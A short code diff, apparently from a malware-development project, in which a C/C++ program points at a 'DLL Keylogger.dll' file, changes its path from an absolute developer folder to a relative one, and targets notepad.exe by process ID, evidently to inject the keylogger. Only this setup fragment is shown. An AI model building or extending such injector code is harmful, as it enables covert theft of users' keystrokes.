@@ -36,7 +36,7 @@ DWORD GetProcessIdByName(const wchar_t* processName) {
 
 int main() {
 
-	const char* dllPath = "C:\\Users\\MALDEV01\\Downloads\\Maldev Projects\\DLL Keylogger\\x64\\Debug\\DLL Keylogger.dll";
+	const char* dllPath = ".\\DLL Keylogger.dll";
 	const wchar_t* targetProcess = L"notepad.exe";
 
 	DWORD pid = GetProcessIdByName(targetProcess);
